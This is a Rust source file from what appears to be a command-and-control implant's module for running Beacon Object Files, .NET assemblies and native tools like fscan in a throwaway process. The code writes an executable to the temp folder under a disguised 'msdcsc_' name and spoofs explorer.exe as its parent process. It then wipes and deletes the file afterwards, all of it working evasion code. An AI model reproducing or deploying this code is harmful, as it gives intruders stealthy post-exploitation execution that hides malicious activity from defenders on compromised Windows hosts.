//! Isolated BOF/.NET execution via PPID-spoofed sacrificial host.
//!
//! Agent does **not** run BOF/CLR in-process. It:
//! 1. Stages short-lived iso_host PE to %TEMP%
//! 2. CreateProcess with parent=explorer.exe + stdin/stdout pipes
//! 3. Writes CIS1 job frame, reads result, waits for exit, deletes PE
//!
//! Host binary: `cupcake-iso-host` (module id `iso_host` or beside agent).

use crate::types::CommandResult;
use log::info;
use std::path::PathBuf;

pub const MOD_ISO_HOST: &str = "iso_host";
const KIND_BOF: u32 = 1;
const KIND_DOTNET: u32 = 2;
const MAGIC: &[u8; 4] = b"CIS1";

/// Execute BOF in isolated host (Windows).
#[cfg(windows)]
pub async fn run_bof_isolated(coff: &[u8], args: &[u8]) -> CommandResult {
    match run_job(KIND_BOF, coff, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated bof: {e}"),
            path: None,
            req_id: None,
        },
    }
}

/// Execute .NET assembly in isolated host (Windows).
#[cfg(windows)]
pub async fn run_dotnet_isolated(assembly: &[u8], args: &[String]) -> CommandResult {
    let args_raw = serde_json::to_vec(args).unwrap_or_default();
    match run_job(KIND_DOTNET, assembly, &args_raw).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated dotnet: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_bof_isolated(_coff: &[u8], _args: &[u8]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(not(windows))]
pub async fn run_dotnet_isolated(_assembly: &[u8], _args: &[String]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

/// Run a native PE (e.g. fscan.exe) in a PPID-spoofed short-lived process.
/// Writes PE to TEMP, CreateProcess with args, captures stdout/stderr, deletes file.
#[cfg(windows)]
pub async fn run_native_isolated(pe: &[u8], args: &str) -> CommandResult {
    match run_native_job(pe, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated native: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_native_isolated(_pe: &[u8], _args: &str) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated native: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(windows)]
async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), String> {
    tokio::task::yield_now().await;
    if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }
    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    let cmdline = if args.trim().is_empty() {
        format!("\"{}\"", path_str)
    } else {
        format!("\"{}\" {}", path_str, args.trim())
    };

    let child = match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, "explorer.exe") {
        Ok(c) => {
            info!("[iso-native] pid={} cmd={}", c.pid, cmdline);
            c
        }
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            return Err(format!("CreateProcess failed: {e}"));
        }
    };

    // Native PE: no CIS1 on stdin — close write end so child sees EOF on stdin
    let _ = crate::native::close_handle(child.stdin_write);

    // Concurrent-ish: wait process then read remaining, or read-to-end blocks until child closes stdout
    let out_buf = crate::native::pipe_read_to_end(child.stdout_read);
    let _ = crate::native::close_handle(child.stdout_read);
    let _ = crate::native::wait_for_single_object(child.h_process);
    let _ = crate::native::close_handle(child.h_process);

    let _ = std::fs::write(&path, b"");
    let _ = std::fs::remove_file(&path);

    // Hybrid decode for GBK console tools like fscan
    let text = {
        #[cfg(feature = "encoding-support")]
        {
            if std::str::from_utf8(&out_buf).is_err() {
                let (cow, _, _) = encoding_rs::GBK.decode(&out_buf);
                cow.into_owned()
            } else {
                String::from_utf8_lossy(&out_buf).into_owned()
            }
        }
        #[cfg(not(feature = "encoding-support"))]
        {
            String::from_utf8_lossy(&out_buf).into_owned()
        }
    };
    Ok((text, String::new()))
}

#[cfg(windows)]
async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, String), String> {
    // Yield so async callers don't block the runtime exclusively forever
    tokio::task::yield_now().await;

    let pe = resolve_iso_host_pe()?;
    let path = write_temp_host(&pe)?;
    let path_str = path.to_string_lossy().to_string();

    // Prefer explorer as fake parent; internal fallbacks try other parents then plain spawn
    let child = match crate::native::spawn::spawn_spoofed_piped_result(&path_str, "explorer.exe") {
        Ok(c) => {
            info!("[iso] spawned host pid={}", c.pid);
            c
        }
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            return Err(format!("CreateProcess failed: {e}"));
        }
    };

    // Build CIS1 frame
    let mut frame = Vec::with_capacity(16 + payload.len() + args.len());
    frame.extend_from_slice(MAGIC);
    frame.extend_from_slice(&kind.to_le_bytes());
    frame.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    frame.extend_from_slice(&(args.len() as u32).to_le_bytes());
    frame.extend_from_slice(payload);
    frame.extend_from_slice(args);

    let write_res = crate::native::pipe_write_all(child.stdin_write, &frame);
    let _ = crate::native::close_handle(child.stdin_write);
    if let Err(e) = write_res {
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        let _ = std::fs::remove_file(&path);
        return Err(e);
    }

    // Read result header
    let hdr = match crate::native::pipe_read_exact(child.stdout_read, 8) {
        Ok(h) => h,
        Err(e) => {
            let _ = crate::native::close_handle(child.stdout_read);
            let _ = crate::native::wait_for_single_object(child.h_process);
            let _ = crate::native::close_handle(child.h_process);
            let _ = std::fs::remove_file(&path);
            return Err(e);
        }
    };
    let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
    let err_len = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]) as usize;
    if out_len > 32 * 1024 * 1024 || err_len > 8 * 1024 * 1024 {
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        let _ = std::fs::remove_file(&path);
        return Err("result too large".into());
    }
    let out_b = crate::native::pipe_read_exact(child.stdout_read, out_len).unwrap_or_default();
    let err_b = crate::native::pipe_read_exact(child.stdout_read, err_len).unwrap_or_default();
    let _ = crate::native::close_handle(child.stdout_read);

    // Wait exit (short timeout via WaitForSingleObject - use native wait)
    let _ = crate::native::wait_for_single_object(child.h_process);
    let _ = crate::native::close_handle(child.h_process);

    // Burn host on disk
    let _ = std::fs::write(&path, b"");
    let _ = std::fs::remove_file(&path);

    Ok((
        String::from_utf8_lossy(&out_b).into_owned(),
        String::from_utf8_lossy(&err_b).into_owned(),
    ))
}

fn resolve_iso_host_pe() -> Result<Vec<u8>, String> {
    // 1) Staged as module payload (not LoadLibrary — host PE)
    #[cfg(feature = "module-loader")]
    {
        if let Some(pe) = crate::module_loader::registry().get_host_pe(MOD_ISO_HOST) {
            if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
                return Ok(pe);
            }
        }
    }
    // 2) Beside agent / cwd
    let mut candidates = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join("cupcake-iso-host.exe"));
            candidates.push(dir.join("iso_host.exe"));
        }
    }
    candidates.push(PathBuf::from("cupcake-iso-host.exe"));
    candidates.push(PathBuf::from("iso_host.exe"));
    for p in candidates {
        if let Ok(b) = std::fs::read(&p) {
            if b.len() > 64 && b[0] == b'M' && b[1] == b'Z' {
                return Ok(b);
            }
        }
    }
    Err(
        "iso_host PE missing: stage module id=iso_host (cupcake-iso-host.exe) or place beside agent"
            .into(),
    )
}

fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
    let mut path = std::env::temp_dir();
    let name = format!(
        "msdcsc_{:08x}.exe",
        crate::utils::next_u32().wrapping_mul(0x45d9f3b)
    );
    path.push(name);
    std::fs::write(&path, pe).map_err(|e| format!("write host: {e}"))?;
    Ok(path)
}
